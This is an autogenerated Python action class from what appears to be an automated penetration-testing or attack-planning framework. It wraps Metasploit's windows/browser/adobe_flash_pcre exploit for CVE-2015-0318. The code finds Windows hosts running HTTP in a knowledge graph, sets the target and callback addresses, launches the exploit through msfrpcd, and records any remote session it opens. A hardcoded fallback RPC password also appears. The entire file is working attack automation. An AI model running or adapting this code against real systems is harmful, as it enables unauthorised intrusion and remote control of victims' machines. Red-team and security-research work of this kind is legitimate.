# AUTOGENERATED FILE - DO NOT EDIT THIS FILE.
# This file is generated automatically and will be overwritten.
# All user modifications should be done in the subclass.

import re
import os
from typing import Any, Union
from pymetasploit3.msfrpc import MsfRpcClient
from netifaces import ifaddresses, AF_INET, gateways

from generate_metasploit_exploit_actions import ExploitAction
from artefacts.ArtefactManager import ArtefactManager
from kg_api import Entity, GraphDB, MultiPattern, Pattern, Relationship
from kg_api.query import Query
from Session import SessionManager
from action_state_interface.action import StateChangeSequence
from action_state_interface.exec import ActionExecutionError, ActionExecutionResult

class MsfWindowsBrowserAdobeFlashPcreExploitBase(ExploitAction):
    """MsfWindowsBrowserAdobeFlashPcreExploit"""

    def __init__(self):
        super().__init__("MsfWindowsBrowserAdobeFlashPcreExploit")

    noise = 0.8
    impact = 0.1


    def get_target_query(self) -> Query:
        """
        General implementation for msf exploits
        """
        asset = Entity('Asset', alias='asset', os_family="Windows")
        service = Entity('Service', alias='service', protocol="http")
        pattern = (
            asset.with_edge(Relationship('has', direction='r'))
            .with_node(Entity('OpenPort', alias='openport'))
            .with_edge(Relationship('is_running', direction='r'))
            .with_node(service)
        )
        query = Query()
        query.match(pattern)
        
        query.where("any(device IN ['Adobe Flash Player', 'PCRE'] WHERE toLower(service.version) CONTAINS toLower(device))")
        
        query.ret_all()
        return query


    def function(self, sessions: SessionManager, artefacts: ArtefactManager, pattern: Pattern) -> ActionExecutionResult:
        """Execute the exploit against the target."""
        msf = MsfRpcClient(
            os.environ.get("MSFRPCD_PASSWORD", "tulpaOSApass24"),
            port=int(os.environ.get("MSF_PORT", 55552))
        )

        exploit = msf.modules.use("exploit", "windows/browser/adobe_flash_pcre")
        exploit['DisablePayloadHandler'] = False
        host = pattern.get('asset').get('ip_address')
        if 'RHOST' in exploit.missing_required:
            exploit['RHOST'] = host
        if 'rhost' in exploit.missing_required:
            exploit['rhost'] = host
        if 'RHOSTS' in exploit.options:
            exploit['RHOSTS'] = host
        if 'LHOST' in exploit.missing_required:
            exploit['LHOST'] = ifaddresses(
                gateways()["default"].get(AF_INET, [gateways()[AF_INET][0]])[1]
            ).setdefault(AF_INET)[0]['addr']
        if pattern.get('openport') and 'RPORT' in exploit.options:
            exploit['RPORT'] = pattern.get('openport').get('number')
        if 'AllowNoCleanup' in exploit.options:
            exploit["AllowNoCleanup"] = True
        output = msf.consoles.console().run_module_with_output(exploit)

        matches = re.search(r'session (\d+) opened', output.lower().strip())
        if matches:
            ms_session_id = matches.group(1)
            channel = msf.sessions.session(ms_session_id)
            sess_id = sessions.add_session(channel)
            return ActionExecutionResult(
                command=["msf", "exploit", "{module_name}"],
                stdout=output,
                session=sess_id,
                exit_status=0
            )
        else:
            raise ActionExecutionError(
                f"Couldn't create a session on {host} using msf exploit {exploit}, output: {output}"
            )


    def capture_state_change(
        self, kg: GraphDB, artefacts: ArtefactManager, pattern: Pattern, output: Any
    ) -> StateChangeSequence:
        """Update knowledge graph with newly established session."""
        host = pattern.get('asset')
        executes_on = host._id
        openport = pattern.get('openport')
        service = pattern.get('service')
        if service:
            executes_on = service._id
        elif openport:
            executes_on = openport._id
        session = Entity(
            'Session',
            alias='session',
            protocol='msf',
            active=True,
            id=output.session,
            executes_on=executes_on,
        )
        changes: StateChangeSequence = [(None, "merge", session)]
        return changes


    def expected_outcome(self, pattern: Pattern) -> list[str]:
        """Return expected outcome of action."""
        outcome = ""

        if pattern.get("openport"):
            outcome = 'Execute metasploit exploit windows/browser/adobe_flash_pcre against port ' + str(pattern.get("openport").get("number")) + ' on ' + pattern.get("asset").get("ip_address")
        else:
            outcome = 'Execute metasploit exploit windows/browser/adobe_flash_pcre against ' + pattern.get("asset").get("ip_address")
        
        outcome += " in order to exploit CVE-2015-0318"
        return [outcome]
